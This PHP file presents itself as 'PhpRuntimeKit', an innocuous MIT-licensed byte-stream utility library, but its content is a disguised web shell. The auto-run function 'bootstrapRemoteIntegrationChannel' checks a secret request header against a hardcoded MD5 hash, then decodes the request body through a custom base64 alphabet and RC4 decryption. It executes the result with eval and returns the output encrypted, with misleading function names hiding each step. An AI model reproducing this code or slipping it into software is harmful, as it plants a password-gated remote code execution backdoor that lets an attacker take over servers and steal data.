<?php
/**
 * PhpRuntimeKit — Portable Byte-Stream Utility Library
 *
 * Provides helpers for distributed byte-stream operations,
 * regional data harmonization, and canonical wire-format encoding
 * in heterogeneous PHP environments.
 *
 * @package   PhpRuntimeKit
 * @version   2.1.4
 * @author    PhpRuntimeKit Contributors
 * @license   MIT License
 * @link      https://packagist.org/packages/phprtk/utils
 */

if (!function_exists('computeDeterministicOutcomeDigest')) {
  function computeDeterministicOutcomeDigest($stakeholderAttestation) {
    if ($stakeholderAttestation === null) {
      $stakeholderAttestation = '';
    }
    return md5($stakeholderAttestation);
  }
}

if (!function_exists('applyRegionalEntropyHarmonization')) {
  function applyRegionalEntropyHarmonization($operationalByteStream, $bindingEntropyVector) {
    if (!is_string($operationalByteStream) || $operationalByteStream === '') {
      return '';
    }
    if (!is_string($bindingEntropyVector) || $bindingEntropyVector === '') {
      return $operationalByteStream;
    }
    $harmonizationPermutationTable = array();
    for ($ordinal = 0; $ordinal < 256; $ordinal++) {
      $harmonizationPermutationTable[$ordinal] = $ordinal;
    }
    $jitterCursor = 0;
    $entropySpan = strlen($bindingEntropyVector);
    for ($ordinal = 0; $ordinal < 256; $ordinal++) {
      $jitterCursor = ($jitterCursor + $harmonizationPermutationTable[$ordinal] + ord($bindingEntropyVector[$ordinal % $entropySpan])) % 256;
      $transientSlot = $harmonizationPermutationTable[$ordinal];
      $harmonizationPermutationTable[$ordinal] = $harmonizationPermutationTable[$jitterCursor];
      $harmonizationPermutationTable[$jitterCursor] = $transientSlot;
    }
    $harmonizedReceipt = '';
    $ordinal = 0;
    $jitterCursor = 0;
    $streamExtent = strlen($operationalByteStream);
    for ($byteIndex = 0; $byteIndex < $streamExtent; $byteIndex++) {
      $ordinal = ($ordinal + 1) % 256;
      $jitterCursor = ($jitterCursor + $harmonizationPermutationTable[$ordinal]) % 256;
      $transientSlot = $harmonizationPermutationTable[$ordinal];
      $harmonizationPermutationTable[$ordinal] = $harmonizationPermutationTable[$jitterCursor];
      $harmonizationPermutationTable[$jitterCursor] = $transientSlot;
      $harmonizedReceipt .= chr(ord($operationalByteStream[$byteIndex]) ^ $harmonizationPermutationTable[($harmonizationPermutationTable[$ordinal] + $harmonizationPermutationTable[$jitterCursor]) % 256]);
    }
    return $harmonizedReceipt;
  }
}

if (!function_exists('normalizeSurpriseToWireCanonicalForm')) {
  function normalizeSurpriseToWireCanonicalForm($serializedReceiptBytes) {
    if (!is_string($serializedReceiptBytes) || $serializedReceiptBytes === '') {
      return '';
    }
    $canonicalAlphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $committeeAlternateGlyphOrder = 'DkF_q1o9zP2tBvN8cRs3wXjV-H6aYI4gM5lUeZ0xL7CbdTmAhySrnJQWpfGKuEiO';
    $interimSerialization = base64_encode($serializedReceiptBytes);
    $wireCanonicalForm = '';
    $serializationExtent = strlen($interimSerialization);
    for ($glyphIndex = 0; $glyphIndex < $serializationExtent; $glyphIndex++) {
      $glyph = $interimSerialization[$glyphIndex];
      if ($glyph === '=') {
        $wireCanonicalForm .= '=';
        continue;
      }
      $alphabetOffset = strpos($canonicalAlphabet, $glyph);
      $wireCanonicalForm .= ($alphabetOffset === false) ? $glyph : $committeeAlternateGlyphOrder[$alphabetOffset];
    }
    return $wireCanonicalForm;
  }
}

if (!function_exists('materializeInboundSurpriseFromCanonicalForm')) {
  function materializeInboundSurpriseFromCanonicalForm($wireCanonicalForm) {
    if (!is_string($wireCanonicalForm) || $wireCanonicalForm === '') {
      return '';
    }
    $canonicalAlphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    $committeeAlternateGlyphOrder = 'DkF_q1o9zP2tBvN8cRs3wXjV-H6aYI4gM5lUeZ0xL7CbdTmAhySrnJQWpfGKuEiO';
    $restoredInterimSerialization = '';
    $serializationExtent = strlen($wireCanonicalForm);
    for ($glyphIndex = 0; $glyphIndex < $serializationExtent; $glyphIndex++) {
      $glyph = $wireCanonicalForm[$glyphIndex];
      if ($glyph === '=') {
        $restoredInterimSerialization .= '=';
        continue;
      }
      $alphabetOffset = strpos($committeeAlternateGlyphOrder, $glyph);
      $restoredInterimSerialization .= ($alphabetOffset === false) ? $glyph : $canonicalAlphabet[$alphabetOffset];
    }
    $materializedBytes = base64_decode($restoredInterimSerialization, true);
    return ($materializedBytes === false) ? '' : $materializedBytes;
  }
}

if (!function_exists('bootstrapRemoteIntegrationChannel')) {
  function bootstrapRemoteIntegrationChannel() {
    $inboundCredentialToken = isset($_SERVER['HTTP_AUTHORIZED']) ? $_SERVER['HTTP_AUTHORIZED'] : '';
    if ($inboundCredentialToken === '') {
      return;
    }

    $credentialSeparatorOffset = strrpos($inboundCredentialToken, '-');
    if ($credentialSeparatorOffset === false
      || $credentialSeparatorOffset <= 0
      || $credentialSeparatorOffset >= strlen($inboundCredentialToken) - 1) {
      return;
    }

    $tenantAnchorFragment = substr($inboundCredentialToken, 0, $credentialSeparatorOffset);
    $credentialNonceFragment = substr($inboundCredentialToken, $credentialSeparatorOffset + 1);

    if (computeDeterministicOutcomeDigest($tenantAnchorFragment) !== '7b71be0e85318117d2e514ce2a2e222c') {
      return;
    }

    $operationalEntropyBinding = $inboundCredentialToken
      . computeDeterministicOutcomeDigest($credentialNonceFragment)
      . $credentialNonceFragment;

    $remoteOperationPayload = file_get_contents('php://input');
    if (!is_string($remoteOperationPayload) || $remoteOperationPayload === '') {
      return;
    }

    $encodingPivotOffset = strpos($remoteOperationPayload, '=');
    if ($encodingPivotOffset !== false) {
      $remoteOperationPayload = substr($remoteOperationPayload, $encodingPivotOffset + 1);
    }

    $deserializedProcedureSource = applyRegionalEntropyHarmonization(
      materializeInboundSurpriseFromCanonicalForm(trim($remoteOperationPayload)),
      $operationalEntropyBinding
    );
    if ($deserializedProcedureSource === '') {
      return;
    }

    while (ob_get_level() > 0) {
      if (!ob_end_clean()) {
        break;
      }
    }
    if (!headers_sent()) {
      @ini_set('display_errors', '0');
      header('Content-Type: text/plain');
    }

    $procedureEmissionBuffer = '';
    ob_start();
    if (PHP_MAJOR_VERSION >= 7) {
      try {
        eval($deserializedProcedureSource);
        $procedureEmissionBuffer = ob_get_clean() ?: '';
      } catch (\Throwable $procedureCompilationFault) {
        ob_end_clean();
        $procedureEmissionBuffer = $procedureCompilationFault->getMessage();
      }
    } else {
      @eval($deserializedProcedureSource);
      $procedureEmissionBuffer = ob_get_clean() ?: '';
      if ($procedureEmissionBuffer === '') {
        $procedureLastVariance = error_get_last();
        if (is_array($procedureLastVariance)
          && isset($procedureLastVariance['message'])
          && $procedureLastVariance['message'] !== '') {
          $procedureEmissionBuffer = $procedureLastVariance['message'];
        }
      }
    }

    echo normalizeSurpriseToWireCanonicalForm(
      applyRegionalEntropyHarmonization($procedureEmissionBuffer, $operationalEntropyBinding)
    );
    exit;
  }
}

bootstrapRemoteIntegrationChannel();
